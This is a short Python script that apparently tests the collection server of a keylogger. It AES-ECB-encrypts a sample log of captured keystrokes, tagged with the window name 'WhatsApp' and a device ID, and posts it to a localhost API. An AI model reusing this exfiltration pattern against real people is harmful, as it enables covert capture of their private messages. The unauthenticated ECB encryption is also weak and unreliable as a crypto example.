from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding

import base64
import requests

# Please, set the AES_KEY you set in the .env file.
ENCRYPTION_KEY = b''

# Encrypts the given message using AES encryption algorithm in ECB mode with PKCS5Padding.
# Returns the Base64-encoded ciphertext.

def encrypt_message(message: str) -> str:
    cipher = Cipher(algorithms.AES(ENCRYPTION_KEY), modes.ECB(), backend=default_backend())
    encryptor = cipher.encryptor()
    padder = padding.PKCS7(128).padder()
    padded_data = padder.update(message.encode()) + padder.finalize()
    ciphertext = encryptor.update(padded_data) + encryptor.finalize()
    return base64.b64encode(ciphertext).decode()

# Sends an HTTP POST request with encrypted data.
# Returns the response from the server.

def send_message(url: str, data: dict) -> requests.Response:
    headers = { 'Content-Type': 'application/json' }
    encrypted_data = { key: encrypt_message(value) for key, value in data.items() }
    response = requests.post(url, json=encrypted_data, headers=headers)
    return response

# Let's try a possible dummy request for sending a new log.
# The log must be sent from an already registered device.

log_data = {
    "uuid": "aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa",
    "ipAddress": "8.8.8.8",
    "logText": "Hi guys, how are you? [RETURN]",
    "windowName": "WhatsApp",
    "timestampBegin": "2024-01-01 15:30:00",
    "timestampEnd": "2024-01-01 15:30:30"
}

response = send_message('http://localhost:6000/api/logs/', log_data)
print('Log sending response:', response.status_code)